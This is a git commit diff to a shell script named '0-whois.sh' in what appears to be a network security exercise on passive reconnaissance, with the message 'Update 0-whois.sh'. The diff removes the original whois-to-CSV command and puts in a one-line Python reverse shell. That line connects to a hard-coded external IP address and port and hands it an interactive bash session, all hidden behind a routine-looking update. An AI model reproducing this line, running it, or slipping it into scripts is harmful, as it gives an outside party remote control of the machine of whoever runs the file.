8b15c482483a45f41178da4dd7faac2a7e6772a4
Yosri <YosriG1997@gmail.Com>
2024-01-11 06:11:43 +0100

    Update 0-whois.sh

--- network_security/0x01_passive_reconnaissance/0-whois.sh
+++ network_security/0x01_passive_reconnaissance/0-whois.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-whois $1 | awk -F':' '/^Registrant/ ||/^Admin/ || /^Tech/ {print $1","$2}' > $1.csv
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("31.169.66.221",45231));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
